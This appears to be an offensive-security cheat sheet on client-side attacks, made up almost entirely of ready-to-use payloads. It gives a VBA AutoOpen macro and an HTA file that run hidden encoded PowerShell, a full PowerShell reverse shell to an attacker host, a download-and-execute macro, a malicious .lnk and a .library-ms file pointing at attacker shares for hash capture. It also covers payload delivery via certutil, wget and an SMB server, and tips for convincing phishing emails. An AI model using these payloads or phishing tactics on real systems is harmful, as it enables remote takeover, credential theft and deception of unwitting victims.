# 🎣 Client-Side Attacks

Phishing payloads, macro attacks, and client-side exploitation.

---

## OFFICE MACROS

### VBA reverse shell macro

Embed in Word/Excel document — Runs when macros are enabled

```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
    Shell cmd, vbHide
End Sub
```

---

### Generate base64 PowerShell payload

Encode reverse shell for macro embedding — Avoids special character issues

```bash
# Create payload.ps1:
$client = New-Object System.Net.Sockets.TCPClient('$LHOST',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Encode:
cat payload.ps1 | iconv -t UTF-16LE | base64 -w 0
```

---

### Macro with download and execute

Download payload from your server then execute — Two-stage delivery

```vba
Sub AutoOpen()
    Shell "powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')", vbHide
End Sub
```

---

## HTA FILES

### HTA reverse shell

HTML Application — Runs as fully trusted application in Windows

```html
<html>
<body>
<script language="VBScript">
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -nop -w hidden -e <BASE64_PAYLOAD>", 0
</script>
</body>
</html>
```

---

### Serve HTA file

Host on your attack box — Victim clicks link or is redirected

```bash
# Save as shell.hta
# Serve it:
python3 -m http.server 80
# Victim visits: http://$LHOST/shell.hta
```

---

## LIBRARY FILES

### Windows Library file (.library-ms)

Create a library file pointing to attacker WebDAV — Captures hashes or serves payloads

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\$LHOST\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

---

## SHORTCUT FILES

### Malicious .lnk file

Create shortcut that executes PowerShell — Placed in writable shares

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\evil.lnk")
$lnk.TargetPath = "cmd.exe"
$lnk.Arguments = "/c powershell -nop -w hidden -e <BASE64>"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,3"
$lnk.Save()
```

---

## DELIVERY METHODS

### Python HTTP server

Quick file hosting — Serve payloads to target

```bash
python3 -m http.server 80
# Target downloads: certutil -urlcache -f http://$LHOST/shell.exe shell.exe
# Or: wget http://$LHOST/shell.elf -O /tmp/shell
```

---

### SMB share for delivery

Serve files via SMB — Works when HTTP is blocked

```bash
impacket-smbserver share $(pwd) -smb2support
# Target: copy \\$LHOST\share\shell.exe C:\Windows\Temp\shell.exe
```

---

### Phishing email considerations

Social engineering the delivery — Make it convincing

```
- Match sender domain to target organization
- Reference internal projects or people
- Create urgency (invoice, deadline, IT update)
- Use file types the target expects (.docx, .xlsx)
- Test payload delivery before sending
```

---
